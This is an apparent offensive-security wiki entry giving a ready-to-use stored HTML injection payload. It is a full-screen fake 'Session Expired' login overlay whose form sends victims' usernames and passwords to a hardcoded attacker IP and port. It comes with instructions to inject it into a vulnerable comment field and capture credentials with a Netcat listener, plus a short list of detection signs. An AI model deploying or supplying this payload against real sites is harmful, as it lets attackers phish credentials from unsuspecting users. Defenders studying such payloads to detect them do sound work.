---
type: code
language: html
verified: true
platforms:
  - Web
tags:
  - html-injection
  - phishing-payload
  - credential-theft
created_at: '2020-07-28T19:07:43.636889+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
validated: true
---

# Fake-Session-Expired-Login-Form

## Code

```html
<div class="code">test</div>
<div style="position: absolute; left: 0px; top: 0px; width: 800px; height: 600px; z-index: 1000; background-color:white;">
  Session Expired, Please Login:<br>
  <form name="login" action="http://192.168.43.183:9999">
    <table>
      <tr><td>Username:</td><td><input type="text" name="uname"/></td></tr>
      <tr><td>Password:</td><td><input type="password" name="pw"/></td></tr>
    </table>
    <input type="submit" value="Login"/>
  </form>
</div>
```

## Description

This HTML code snippet creates a full-screen overlay fake login form that appears as a session expiration notice. It includes fields for username and password, styled with absolute positioning and high z-index to cover the legitimate page content. When submitted, the form sends a POST request with 'uname' and 'pw' parameters to the specified action URL, allowing credential capture on the attacker's listener.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| IP in action URL | Attacker's IP address (hardcoded; replace before use) | 192.168.43.183 |
| Port in action URL | Listener port (hardcoded; replace before use) | 9999 |

## Usage

Inject this code into a stored HTML injection vulnerability (e.g., web app comment field). Ensure the action URL points to your Netcat listener (replace hardcoded IP/port). Victims viewing the page will see the overlay and be prompted to 'login', submitting credentials directly to the attacker. Use in conjunction with a listener like Netcat on the specified IP/port.

## Detection

- Browser developer tools reveal suspicious absolute-positioned divs with high z-index or unauthorized form actions.
- Web server logs show anomalous POSTs to internal/external IPs from user agents.
- Content security policies (CSP) violations if inline styles/forms are restricted.
- User reports of unexpected login prompts; scan stored content for unescaped HTML.

## Related

- [[procedures/Stored-HTML-Injection-for-Credential-Theft]]
- [[tools/Netcat]]
